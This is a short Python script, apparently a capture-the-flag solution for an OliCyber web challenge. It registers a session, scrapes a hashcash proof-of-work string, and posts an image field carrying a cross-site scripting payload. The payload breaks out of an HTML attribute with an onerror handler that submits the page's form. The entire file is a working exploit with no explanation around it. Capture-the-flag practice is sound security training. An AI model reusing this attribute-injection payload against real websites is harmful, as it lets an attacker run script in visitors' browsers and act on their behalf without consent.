import requests, re, time

URL = "https://cinghiali.challs.olicyber.it/"
REGEX = r'hashcash -mCb26 ".*"'
EXPLOIT = "asfasf\" onerror=\"document.getElementsByTagName('form')[0].submit()"

s = requests.Session()
s.post(URL + 'register')

r = s.get(URL + 'create')
hashcash = re.findall(REGEX, r.text)[0]
print(hashcash)
hashcash = input(f"Resolve >> ")

s.post(URL + 'create', data={
    'address': 'ihdasodfhuisfdah',
    'image': EXPLOIT,
    'pow': hashcash
})

time.sleep(7)
print(s.get(URL).text)